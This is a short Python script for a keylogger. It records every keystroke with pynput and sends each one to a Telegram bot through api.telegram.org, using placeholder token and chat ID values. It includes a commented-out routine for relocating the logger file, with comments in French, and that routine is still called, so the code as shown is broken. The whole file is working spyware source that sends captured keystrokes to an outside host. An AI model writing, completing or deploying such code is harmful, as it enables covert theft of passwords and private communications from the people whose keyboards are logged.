import requests
from pynput import keyboard
import time
import shutil
import os

token = "your token id"
chat_id = "your chat_id"

url = f'https://api.telegram.org/bot{token}/sendMessage'

#if you want change the pass of the keylogger change path for the path of keylogger and source for the source of the new path
'''def mv_folder():
    user = os.getlogin()

    path = fr"dl path"
    source = fr"source path"

    try:
        shutil.move('path', 'source')
    except Exception as e:
        print(f"vous devez executer se script en tant qu'administrateur, veuillez le relancer. le code d'erreur est {e}")
    
'''
def on_press(key):
    try:
        letre = key.char
    except AttributeError:
        letre = key

    
    params = {
        'chat_id': chat_id,
        'text': letre
    }

    reponse = requests.get(url, params=params)



mv_folder()

while 1:
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
    print("1")

